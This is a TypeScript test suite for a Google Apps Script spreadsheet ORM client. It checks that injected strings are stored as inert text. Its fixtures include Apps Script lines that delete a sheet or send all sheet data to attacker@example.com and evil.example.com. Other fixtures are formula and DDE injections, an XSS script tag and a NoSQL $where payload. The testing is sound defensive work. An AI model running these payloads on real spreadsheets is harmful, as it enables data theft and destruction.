import { GassmaClient } from "../../generated/gassma/gassmaClient";
import { assertEquals } from "../../assert/assertEquals";
import { getSheetSnapshot } from "../../assert/getSheetSnapshot";
import { resetSheet } from "../../reset/resetSheet";
import { productData } from "../../consts/productData";

function testInjection() {
  const client = new GassmaClient();

  testCreateWithGasCode(client);
  testCreateWithJsonString(client);
  testCreateWithFormulaInjection(client);
  testCreateWithSpecialCharacters(client);
  testWhereWithGasCode(client);
  testWhereWithJsonString(client);
  testWhereContainsRegexMetaChars(client);
  testWhereStartsWithRegexMetaChars(client);
  testWhereEndsWithRegexMetaChars(client);
  testUpdateWithGasCode(client);

  Logger.log("✅ testInjection: all passed");
}

function testCreateWithGasCode(client: GassmaClient) {
  const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';

  const result = client.sheets.Product.create({
    data: {
      id: 900,
      name: gasCode,
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  assertEquals(result.name, gasCode, "create GAS code: return value should be plain string");

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowExists({ id: 900 });
  snapshot.assertRowEquals({ id: 900 }, { name: gasCode });

  resetSheet("Product", productData);
}

function testCreateWithJsonString(client: GassmaClient) {
  const jsonPayload = JSON.stringify({
    action: "deleteSheet",
    target: "Product",
    code: "GmailApp.sendEmail('attacker@example.com', 'data', JSON.stringify(SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues()))",
  });

  const result = client.sheets.Product.create({
    data: {
      id: 901,
      name: jsonPayload,
      price: 200,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  assertEquals(result.name, jsonPayload, "create JSON: return value should be plain string");

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowExists({ id: 901 });
  snapshot.assertRowEquals({ id: 901 }, { name: jsonPayload });

  resetSheet("Product", productData);
}

function testCreateWithFormulaInjection(client: GassmaClient) {
  const formulas = [
    "=1+1",
    "=IMPORTRANGE(\"https://docs.google.com/spreadsheets/d/xxx\",\"Sheet1!A1\")",
    "=IMAGE(\"https://evil.example.com/tracker.png\")",
    "+cmd|'/C calc'!A0",
    "-1+1",
    "@SUM(A1:A10)",
  ];

  formulas.forEach((formula, i) => {
    const id = 910 + i;
    const result = client.sheets.Product.create({
      data: {
        id: id,
        name: formula,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    const findResult = client.sheets.Product.findFirstOrThrow({
      where: { id: id },
    });

    if (typeof findResult.name !== "string") {
      throw new Error(`formula injection id=${id}: name should be string, got ${typeof findResult.name}`);
    }
  });

  resetSheet("Product", productData);
}

function testCreateWithSpecialCharacters(client: GassmaClient) {
  const specialNames = [
    "test\0null",
    "test\ttab",
    "test\nnewline",
    'test"doublequote"end',
    "test'singlequote'end",
    "test\\backslash\\end",
    "テスト<script>alert('xss')</script>",
    "test${`template`}literal",
  ];

  specialNames.forEach((name, i) => {
    const id = 920 + i;
    client.sheets.Product.create({
      data: {
        id: id,
        name: name,
        price: 100,
        stock: 1,
        status: "available",
        createdAt: new Date("2025-01-01T00:00:00"),
      },
    });

    const findResult = client.sheets.Product.findFirstOrThrow({
      where: { id: id },
    });

    if (typeof findResult.name !== "string") {
      throw new Error(`special chars id=${id}: name should be string, got ${typeof findResult.name}`);
    }
  });

  resetSheet("Product", productData);
}

function testWhereWithGasCode(client: GassmaClient) {
  const gasCode = 'SpreadsheetApp.getActiveSpreadsheet().deleteSheet(SpreadsheetApp.getActiveSpreadsheet().getSheetByName("Product"))';

  const results = client.sheets.Product.findMany({
    where: { name: gasCode },
  });

  assertEquals(results.length, 0, "where GAS code: should return 0 records");
}

function testWhereWithJsonString(client: GassmaClient) {
  const jsonPayload = JSON.stringify({
    $where: "function() { return true; }",
    name: { $regex: ".*" },
  });

  const results = client.sheets.Product.findMany({
    where: { name: jsonPayload },
  });

  assertEquals(results.length, 0, "where JSON/NoSQL injection: should return 0 records");
}

function testWhereContainsRegexMetaChars(client: GassmaClient) {
  const client2 = new GassmaClient();

  client2.sheets.Product.create({
    data: {
      id: 930,
      name: "test.product",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  client2.sheets.Product.create({
    data: {
      id: 931,
      name: "testXproduct",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client2.sheets.Product.findMany({
    where: {
      name: { contains: "t.p" },
    },
  });

  const matchedIds = results.map((r) => r.id);

  if (matchedIds.indexOf(930) === -1) {
    throw new Error("contains regex: should match 'test.product' (literal dot)");
  }

  // NOTE: 現状 contains は正規表現として解釈するため "testXproduct" にもマッチする可能性がある
  // Prisma は文字列リテラルとして扱うので、これは既知の挙動差異
  if (matchedIds.indexOf(931) !== -1) {
    Logger.log("⚠️ contains regex: 'testXproduct' matched 't.p' (dot treated as regex wildcard - known behavior difference from Prisma)");
  }

  resetSheet("Product", productData);
}

function testWhereStartsWithRegexMetaChars(client: GassmaClient) {
  const client2 = new GassmaClient();

  client2.sheets.Product.create({
    data: {
      id: 932,
      name: ".*allMatch",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  const results = client2.sheets.Product.findMany({
    where: {
      name: { startsWith: ".*" },
    },
  });

  // ".*" が正規表現として解釈されると全件ヒットする
  // Prisma は文字列リテラルとして扱うので ".*allMatch" のみマッチすべき
  if (results.length > 10) {
    Logger.log(`⚠️ startsWith regex: '.*' matched ${results.length} records (regex wildcard interpreted - known behavior difference from Prisma)`);
  }

  resetSheet("Product", productData);
}

function testWhereEndsWithRegexMetaChars(client: GassmaClient) {
  const client2 = new GassmaClient();

  client2.sheets.Product.create({
    data: {
      id: 933,
      name: "product(v1)",
      price: 100,
      stock: 1,
      status: "available",
      createdAt: new Date("2025-01-01T00:00:00"),
    },
  });

  // 正規表現メタ文字 () を含むパターン
  // 正規表現として解釈されるとグルーピングになりクラッシュする可能性
  let didThrow = false;
  try {
    client2.sheets.Product.findMany({
      where: {
        name: { endsWith: "(v1)" },
      },
    });
  } catch (e) {
    didThrow = true;
    Logger.log(`⚠️ endsWith regex: threw error with parentheses pattern - ${e}`);
  }

  if (!didThrow) {
    Logger.log("✓ endsWith regex: parentheses pattern did not throw");
  }

  resetSheet("Product", productData);
}

function testUpdateWithGasCode(client: GassmaClient) {
  const gasCode = 'UrlFetchApp.fetch("https://evil.example.com/steal?data=" + SpreadsheetApp.getActiveSpreadsheet().getDataRange().getValues())';

  client.sheets.Product.update({
    where: { id: 1 },
    data: { name: gasCode },
  });

  const snapshot = getSheetSnapshot("Product");
  snapshot.assertRowEquals({ id: 1 }, { name: gasCode });

  const findResult = client.sheets.Product.findFirstOrThrow({
    where: { id: 1 },
  });
  assertEquals(findResult.name, gasCode, "update GAS code: should be stored as plain string");

  resetSheet("Product", productData);
}

export { testInjection };
